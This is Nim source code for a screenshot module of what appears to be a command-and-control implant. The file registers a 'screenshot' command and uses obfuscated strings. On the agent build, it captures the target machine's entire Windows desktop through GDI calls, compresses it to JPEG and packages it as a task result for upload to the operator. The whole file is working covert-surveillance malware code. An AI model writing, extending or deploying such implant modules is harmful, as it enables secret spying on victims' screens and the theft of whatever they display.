import ../common/[types, utils]

# Define function prototype
proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let module* = Module(
    name: protect("screenshot"), 
    description: protect("Take and retrieve a screenshot of the target desktop."),
    moduleType: MODULE_SCREENSHOT,
    commands: @[
        Command(
            name: protect("screenshot"),
            commandType: CMD_SCREENSHOT,
            description: protect("Take a screenshot of the target system."),
            example: protect("screenshot"),
            arguments: @[],
            execute: executeScreenshot
        )
    ]
)

# Implement execution functions
when not defined(agent):
    proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import winim/lean
    import winim/inc/wingdi
    import strformat, times, pixie
    import stb_image/write as stbiw
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../common/serialize

    proc bmpToJpeg(data: seq[byte], quality: int = 80): seq[byte] =
        let img: Image = decodeImage(Bytes.toString(data))
    
        # Convert to JPEG image for smaller file size
        var rgbaData = newSeq[byte](img.width * img.height * 4)
        var i = 0
        for y in 0..<img.height:
            for x in 0..<img.width:
                let color = img[x, y]
                rgbaData[i] = color.r
                rgbaData[i + 1] = color.g
                rgbaData[i + 2] = color.b
                rgbaData[i + 3] = color.a
                i += 4
        
        return stbiw.writeJPG(img.width, img.height, 4, rgbaData, quality)

    proc takeScreenshot(): seq[byte] = 
        
        var
            screenshotLength: ULONG 
            screenshotBytes: PVOID

            bmpFileHeader: BITMAPFILEHEADER
            bmpInfoHeader: BITMAPINFOHEADER
            bmpInfo: BITMAPINFO 
            desktop: BITMAP 
            deviceCtx: HDC 
            memDeviceCtx: HDC 
            bmpSection: HBITMAP 
            gdiCurrent: HGDIOBJ
            gdiObject: HGDIOBJ 
            resX: INT 
            resY: INT 
            bitsLength: ULONG 
            bitsBuffer: PVOID 
        
        zeroMem(addr bmpFileHeader, sizeof(BITMAPFILEHEADER))
        zeroMem(addr bmpInfoHeader, sizeof(BITMAPINFOHEADER))
        zeroMem(addr bmpInfo, sizeof(BITMAPINFO))
        zeroMem(addr desktop, sizeof(BITMAP))

        # Retrieve system resolution 
        resX = GetSystemMetrics(SM_XVIRTUALSCREEN)
        resY = GetSystemMetrics(SM_YVIRTUALSCREEN)

        # Obtain handle to the device context for the entire screen
        deviceCtx = GetDC(0)
        if deviceCtx == 0: 
            raise newException(CatchableError, GetLastError().getError())
        defer: ReleaseDC(0, deviceCtx)

        # Fetch BITMAP structure using GetCurrentObject and GetObjectW
        gdiCurrent = GetCurrentObject(deviceCtx, OBJ_BITMAP)
        if gdiCurrent == 0: 
            raise newException(CatchableError, GetLastError().getError())
        defer: DeleteObject(gdiCurrent)

        if GetObjectW(gdiCurrent, ULONG(sizeof(BITMAP)), addr desktop) == 0: 
            raise newException(CatchableError, GetLastError().getError())

        # Construct BMP headers
        # Calculate amount of bits required to represent screenshot
        bitsLength = ((( 24 * desktop.bmWidth + 31) and not 31) div 8) * desktop.bmHeight

        bmpFileHeader.bfType = 0x4D42 # Signature of the BMP file, "BM"
        bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)
        bmpFileHeader.bfSize =  sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bitsLength

        bmpInfoHeader.biSize = ULONG(sizeof(BITMAPINFOHEADER))
        bmpInfoHeader.biBitCount = 24                       # Color depth (same as defined in the formula above)
        bmpInfoHeader.biCompression = BI_RGB                # uncompressed RGB format
        bmpInfoHeader.biPlanes = 1                          # Number of color planes, always set to 1
        bmpInfoHeader.biWidth = desktop.bmWidth             # Width of the bitmap image
        bmpInfoHeader.biHeight = desktop.bmHeight           # Height of the bitmap image

        # Size calculation and memory allocation
        screenshotLength = bmpFileHeader.bfSize
        screenshotBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, screenshotLength)
        if screenshotBytes == NULL: 
            raise newException(CatchableError, GetLastError().getError())
        defer: HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, screenshotBytes)

        # Assembly the bitmap image 
        memDeviceCtx = CreateCompatibleDC(deviceCtx)
        if memDeviceCtx == 0: 
            raise newException(CatchableError, GetLastError().getError())
        defer: ReleaseDC(0, memDeviceCtx)
        
        # Initialize BITMAPINFO with prepared info header
        bmpInfo.bmiHeader = bmpInfoHeader

        bmpSection = CreateDIBSection(deviceCtx, addr bmpInfo, DIB_RGB_COLORS, addr bitsBuffer, cast[HANDLE](NULL), 0) 
        if bmpSection == 0 or bitsBuffer == NULL: 
            raise newException(CatchableError, GetLastError().getError())
    
        # Select the newly created bitmap into the memory device context
        gdiObject = SelectObject(memDeviceCtx, bmpSection)
        if gdiObject == 0: 
            raise newException(CatchableError, GetLastError().getError())
        defer: DeleteObject(gdiObject)

        # Copy the screen content from the source device context to the memory device context
        if BitBlt(
            memDeviceCtx,                           # Destination device context
            0, 0,                                   # Destination coordinates
            desktop.bmWidth, desktop.bmHeight,      # Dimensions of the area to copy
            deviceCtx,                              # Source device context
            resX, resY,                             # Source coordinates
            SRCCOPY                                 # Copy source directly to destination
        ) == 0: 
            raise newException(CatchableError, GetLastError().getError())

        # Return the screenshot as a seq[byte]
        result = newSeq[byte](screenshotLength)
        copyMem(addr result[0], addr bmpFileHeader, sizeof(BITMAPFILEHEADER))
        copyMem(addr result[sizeof(BITMAPFILEHEADER)], addr bmpInfoHeader, sizeof(BITMAPINFOHEADER))
        copyMem(addr result[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)], bitsBuffer, bitsLength)

    proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = 
        try: 

            print "    [>] Taking and uploading screenshot."

            let
                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.jpeg"
                screenshotBytes: seq[byte] = bmpToJpeg(takeScreenshot())

            var packer = Packer.init() 

            packer.addDataWithLengthPrefix(string.toBytes(screenshotFilename))
            packer.addDataWithLengthPrefix(screenshotBytes)

            let data = packer.pack() 

            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
